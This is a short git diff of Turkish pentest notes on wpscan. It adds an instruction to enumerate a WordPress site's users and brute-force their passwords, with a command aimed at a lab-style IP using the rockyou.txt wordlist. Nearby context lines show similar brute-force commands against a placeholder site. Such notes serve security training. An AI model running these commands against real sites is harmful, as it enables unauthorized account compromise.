@@ -11,7 +11,10 @@ wpscan --url http://hedefsite.com -e u
 ```bash
 / bunları siledebiliriz boşluk bırakıyor onlar !!!
 ```
-
+hedef site üzerindeki userleri bul ve bulduğun userlere direkt bruteforce at !!
+```bash
+wpscan --url http://10.10.91.62/ -e u -P /usr/share/wordlists/rockyou.txt
+```
 Brute Force Şifre Denemesi
 ```bash
 wpscan --url http://hedefsite.com \
